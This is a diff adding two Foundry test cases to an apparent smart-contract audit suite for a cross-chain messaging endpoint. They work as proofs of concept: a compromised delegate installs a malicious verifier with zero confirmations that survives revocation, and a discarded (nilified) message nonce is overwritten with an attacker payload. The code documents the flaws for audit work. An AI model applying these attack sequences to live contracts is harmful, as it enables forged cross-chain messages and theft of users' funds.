@@ -366,6 +366,133 @@ contract AccessControlTest is AuditBase {
         emit log("2. All subsequent send() calls revert -- outbound permanently blocked");
     }
 
+    // ==================== AV5.9: Config Persists After Delegate Revocation ====================
+    /// @dev Config changes made by a compromised delegate PERSIST even after the delegate is revoked.
+    ///      OApp owner might revoke delegate thinking the damage is contained, but the weakened
+    ///      config remains active and can be exploited by anyone calling commitVerification.
+    function test_AV5_9_ConfigPersistsAfterDelegateRevocation() public {
+        address delegate = address(0xDE1E);
+        dstEndpoint.setDelegate(delegate);
+
+        // Step 1: Delegate weakens config to malicious DVN + zero confirmations
+        DVN maliciousDvn = _deployExtraDVN();
+        address[] memory malDvns = new address[](1);
+        malDvns[0] = address(maliciousDvn);
+
+        UlnConfig memory weakConfig = UlnConfig({
+            confirmations: type(uint64).max, // NIL_CONFIRMATIONS -> 0
+            requiredDVNCount: 1,
+            optionalDVNCount: 0,
+            optionalDVNThreshold: 0,
+            requiredDVNs: malDvns,
+            optionalDVNs: new address[](0)
+        });
+        _setOAppConfigAs(delegate, address(this), weakConfig);
+
+        // Step 2: OApp owner detects compromise and revokes delegate
+        dstEndpoint.setDelegate(address(0));
+        assertEq(dstEndpoint.delegates(address(this)), address(0), "Delegate should be revoked");
+
+        // Step 3: Weakened config STILL PERSISTS after revocation!
+        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
+        assertEq(resolved.confirmations, 0, "Weakened config persists: 0 confirmations");
+        assertEq(resolved.requiredDVNs[0], address(maliciousDvn), "Weakened config persists: malicious DVN");
+
+        // Step 4: Malicious DVN can still exploit the weakened config
+        Packet memory packet = _makePacket(1, address(this), address(this), "post_revoke");
+        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);
+
+        _dvnVerify(maliciousDvn, dstReceiveUln, header, payloadHash, 0);
+        _commitVerification(dstReceiveUln, header, payloadHash);
+
+        // Verify: message committed under weakened config even though delegate is revoked
+        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));
+        bytes32 stored = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
+        assertEq(stored, payloadHash, "Message committed under persistent weakened config");
+
+        // Step 5: OApp owner CAN manually restore config (remediation exists but requires awareness)
+        address[] memory restoredDvns = new address[](1);
+        restoredDvns[0] = address(dstDvn);
+        UlnConfig memory restoredConfig = UlnConfig({
+            confirmations: 20,
+            requiredDVNCount: 1,
+            optionalDVNCount: 0,
+            optionalDVNThreshold: 0,
+            requiredDVNs: restoredDvns,
+            optionalDVNs: new address[](0)
+        });
+        _setOAppConfig(address(this), restoredConfig);
+
+        UlnConfig memory afterRestore = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
+        assertEq(afterRestore.confirmations, 20, "OApp owner can restore config manually");
+        assertEq(afterRestore.requiredDVNs[0], address(dstDvn), "DVN restored to legitimate");
+
+        emit log("CONFIRMED: Config changes persist after delegate revocation");
+        emit log("Revoking delegate does NOT undo config changes -- manual restoration required");
+    }
+
+    // ==================== AV5.10: Nilified Nonce Resurrection via Re-verification ====================
+    /// @dev After nilify, the hash is NIL_PAYLOAD_HASH (not empty). Since _verifiable()
+    ///      returns true when hash != empty, a nilified nonce can be "resurrected" via
+    ///      re-verification with any payload hash. This overrides the nilification,
+    ///      potentially restoring a message the OApp intended to permanently discard.
+    function test_AV5_10_NilifiedNonceResurrection() public {
+        address delegate = address(0xDE1E);
+        dstEndpoint.setDelegate(delegate);
+
+        // Step 1: Legitimate message verified and committed
+        Packet memory packet = _makePacket(1, address(this), address(this), "legit");
+        (, bytes memory header, , bytes32 legitimatePayloadHash) = _encodeAndSplit(packet);
+        _dvnVerify(dstDvn, dstReceiveUln, header, legitimatePayloadHash, 1);
+        _commitVerification(dstReceiveUln, header, legitimatePayloadHash);
+
+        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));
+
+        // Step 2: OApp owner nilifies the nonce -- marking it as discarded
+        // Note: nilify sets hash to NIL_PAYLOAD_HASH, which is NOT the same as deleting
+        dstEndpoint.nilify(address(this), SRC_EID, senderBytes32, 1, legitimatePayloadHash);
+        bytes32 afterNilify = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
+        assertEq(afterNilify, NIL_PAYLOAD_HASH, "Hash should be NIL after nilify");
+
+        // Step 3: Check verifiable -- NIL_PAYLOAD_HASH is NOT empty, so verifiable returns true!
+        Origin memory origin = Origin(SRC_EID, senderBytes32, 1);
+        bool canVerify = dstEndpoint.verifiable(origin, address(this));
+        assertTrue(canVerify, "Nilified nonce is STILL verifiable (hash is non-empty)");
+
+        // Step 4: Compromised delegate changes config to malicious DVN
+        DVN maliciousDvn = _deployExtraDVN();
+        address[] memory malDvns = new address[](1);
+        malDvns[0] = address(maliciousDvn);
+
+        UlnConfig memory malConfig = UlnConfig({
+            confirmations: type(uint64).max,
+            requiredDVNCount: 1,
+            optionalDVNCount: 0,
+            optionalDVNThreshold: 0,
+            requiredDVNs: malDvns,
+            optionalDVNs: new address[](0)
+        });
+        _setOAppConfigAs(delegate, address(this), malConfig);
+
+        // Step 5: Malicious DVN re-verifies with attacker payload
+        bytes32 attackerPayloadHash = keccak256("attacker_controlled_payload");
+        _dvnVerify(maliciousDvn, dstReceiveUln, header, attackerPayloadHash, 0);
+
+        // Step 6: Re-commit -- overwrites NIL_PAYLOAD_HASH with attacker payload
+        _commitVerification(dstReceiveUln, header, attackerPayloadHash);
+
+        bytes32 afterResurrection = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
+        assertEq(afterResurrection, attackerPayloadHash, "Nilified nonce resurrected with attacker payload");
+        assertTrue(afterResurrection != NIL_PAYLOAD_HASH, "NIL_PAYLOAD_HASH was overwritten");
+
+        emit log("CONFIRMED: Nilified nonce can be resurrected via re-verification");
+        emit log("1. Legitimate message committed, then nilified by OApp");
+        emit log("2. NIL_PAYLOAD_HASH is non-empty -> verifiable() returns true");
+        emit log("3. Delegate changes config, malicious DVN re-verifies");
+        emit log("4. commitVerification overwrites NIL with attacker payload");
+        emit log("5. The OApp's nilification is UNDONE -- nonce is executable again");
+    }
+
     // ==================== Helpers ====================
 
     uint256 internal _dvnCounter = 100;
